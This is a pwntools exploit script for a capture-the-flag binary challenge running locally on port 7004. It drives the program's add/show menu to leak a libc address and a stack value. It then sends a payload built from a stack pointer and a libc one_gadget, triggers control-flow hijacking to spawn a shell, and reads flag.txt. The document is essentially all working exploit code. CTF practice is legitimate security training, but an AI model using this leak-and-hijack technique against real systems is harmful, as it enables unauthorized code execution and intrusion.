#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = '../challenge/chall'
elf = context.binary = ELF(exe, checksec=True)
libc = '../challenge/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '127.0.0.1', 7004

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
# break *vuln
# breakrva 0x130c 
breakrva 0x1460
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
LATEST = -1
def add(d, s):
    global LATEST
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'd >', d)
    io.sendlineafter(b's >', s)
    LATEST = LATEST + 1

def exploit():
    global io
    io = initialize()

    for i in range(5):
        add(b'77', b'idk')
    add(b'+', b'idk')

    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'idx >', str(LATEST).encode())
    io.recvuntil(b'd := ')
    libc.address = int(io.recvline()) - libc.sym['_IO_2_1_stdin_']

    for i in range(3):
        add(b'77', b'idk')
    add(b'+', b'idk')

    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'idx >', str(LATEST).encode())
    io.recvuntil(b'd := ')
    stack = int(io.recvline())

    one_gadgets = [0xebc81, 0xebc85, 0xebc88, 0xebce2, 0xebd38, 0xebd3f, 0xebd43]
    payload = p64(stack) + p64(libc.address + one_gadgets[5])
    add(b'77', b'idk')
    add(b'+', payload)

    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'idx >', b'-1') # trigger rop

    io.sendline(b'cat flag.txt')

    log.success("libc base: %#x", libc.address)
    log.success("stack: %#x", stack)
    io.interactive()
    
if __name__ == '__main__':
    exploit()